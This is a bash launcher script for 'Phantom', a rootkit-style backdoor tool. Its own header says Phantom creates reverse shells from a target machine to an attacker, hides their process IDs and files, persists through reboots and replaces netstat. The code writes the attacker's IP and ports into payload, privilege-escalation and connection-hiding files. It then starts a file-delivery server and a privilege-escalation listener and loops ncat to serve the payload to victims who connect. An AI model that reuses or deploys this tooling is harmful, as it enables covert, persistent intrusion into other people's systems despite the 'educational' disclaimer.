#!/bin/bash

: 'Phantom is a tool which creates backdoor shells from a target machine to an attacker`s and
hides their pid, persisting through reboots. It also hides the files needed to perform the above and replaces netstat.

***Phantom was created for educational purposes. Stay away from illegal activities.***

Copyright Â© 2018 Konstantinos Sarantopoulos

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'

#check the number of arguments given
if [ $# -ne 3 ]; then
  cat << EOF
Syntax: phantom-init [ip=][port1=][port2=]

ip:    the attacker's ip (e.g. ip=127.0.0.1)
port1: the port that listens for connections to deliver the payload (e.g. port1=8888)
port2: the port that listens for the backdoor shells after delivering the payload
EOF
  exit
fi

#parse the arguments
for i in $@; do
  if [ "$(expr $i : ip)" != "0" ]; then
    ip=${i#*=}
  elif [ "$(expr $i : port1)" != "0" ]; then
    port1=${i#*=}
  elif [ "$(expr $i : port2)" != "0" ]; then
    port2=${i#*=}
  fi
done

#find the script's path
path=$(dirname $0)

#initialize portp and portr (15000-16000)
portp=$((15000 + $((RANDOM % 1000))))
portr=$((15000 + $((RANDOM % 1000))))
listening_port_list=$(netstat -tpnl 2>/dev/null | awk '{ print $4 }' | awk -F: '{ print $2 }')
while true; do
  check=1
  phantom_port_list=($portp $portr)
  for i in $listening_port_list; do
    for j in $phantom_port_list; do
      if [ $i == $j ]; then
        portp=$((15000 + $((RANDOM % 1000))))
        portr=$((15000 + $((RANDOM % 1000))))
        ckeck=0
      fi
    done
  done
  if [ $check == "1" ]; then
    break
  fi
done

#trap ctrl-c to kill the spawned processes
pid=()
kill_process() {
  printf "\n"
  #first kill the background processes otherwise they will continuously spawn new processes
  for i in ${pid[*]}; do
    kill -9 $i
  done
  listening_port_list=$(netstat -tpnl 2>/dev/null | awk '{ print $4 }' | awk -F: '{ print $2 }')
  for i in ${listening_port_list[@]}; do
    if [ $i == $portp ] || [ $i == $portr ]; then
      fuser -k $i/tcp &>/dev/null
    fi
  done
  exit
}
trap kill_process SIGINT

#--------------------------------------------------replace variables in scripts------------------------------------
#replace ip, port2, portp and portr in payload
sed -i "s%ip=\".*\"%ip=\"$ip\"%" $path/payload
sed -i "s%port2=\".*\"%port2=\"$port2\"%" $path/payload
sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/payload
sed -i "s%portr=\".*\"%portr=\"$portr\"%" $path/payload

#replace portp in python_server
sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/python_server

#-replace the ip and port in usb_bus_script-
#convert the ip to hex
IFS='.' read -r -a ip_dec <<<$ip
ip_hex=()
hex_ip=""
for ((i=0; i < ${#ip_dec[@]}; i++)); do
  if [ ${ip_dec[$i]} -gt 15 ]; then
    ip_hex[${#ip_dec[@]}-$i]=$(printf "%x" ${ip_dec[$i]})
  else
    ip_hex[${#ip_dec[@]}-$i]=$(printf "0%x" ${ip_dec[$i]})
  fi
done
for i in ${ip_hex[@]}; do
  hex_ip+=$i
done
#convert all letters to upper (needed for /proc/net/tcp)
hex_ip=$(echo $hex_ip | tr [:lower:] [:upper:])
#convert the port to hex
hex_port=$(printf "%x" $port2)
#convert all letters to upper (needed for /proc/net/tcp)
hex_port=$(echo $hex_port | tr [:lower:] [:upper:])
#replace the ip:port in services
sed -i "s%~ /.*:.*/%~ /$hex_ip:$hex_port/%" $path/misc/services

#replace the ip and port in phantom-firewall
sed -i "s%~ /.*:.*/%~ /$ip:$port2/%" $path/phantom-firewall

#replace ip, port2 and portp in priv_esc_payload
sed -i "s%ip=\".*\"%ip=\"$ip\"%" $path/priv_esc_payload
sed -i "s%port2=\".*\"%port2=\"$port2\"%" $path/priv_esc_payload
sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/priv_esc_payload

#------------------------------------------------------------start the scripts--------------------------------------------------

#start the server that is gonna transfer the files needed by the payload to the target machine
$path/python_server &
pid+=($!)

#start the script that will accept connections after priviledge escalation
$path/priv_esc_init portr=$portr path=$path &
pid+=($!)

#start ncat and invoke the phantom script when a connection occurs
while true; do
  ncat -v -l -p $port1 <$path/payload
done
